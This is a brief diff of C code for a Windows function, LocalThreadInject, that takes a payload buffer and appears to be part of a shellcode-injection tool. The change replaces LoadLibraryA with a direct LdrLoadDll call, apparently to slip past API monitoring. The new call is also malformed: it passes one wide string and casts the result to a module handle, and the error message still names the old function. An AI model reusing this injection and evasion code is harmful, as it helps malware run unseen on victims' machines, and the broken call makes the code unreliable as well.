@@ -10,7 +10,7 @@
 BOOL LocalThreadInject(IN PBYTE pbPayload[], IN SIZE_T sPayloadSize) {
     HMODULE hKernel32 = NULL;
 
-    if ( ( hKernel32 = LoadLibraryA( "KERNEL32.dll" ) ) == NULL ) {
+    if ( ( hKernel32 = ( HMODULE ) LdrLoadDll( L"KERNEL32.dll" ) ) == NULL ) {
         #ifdef DEBUG
         printf( "[-] LoadLibraryA Failed with Error -> %d\n", GetLastError() );
         #endif // !DEBUG
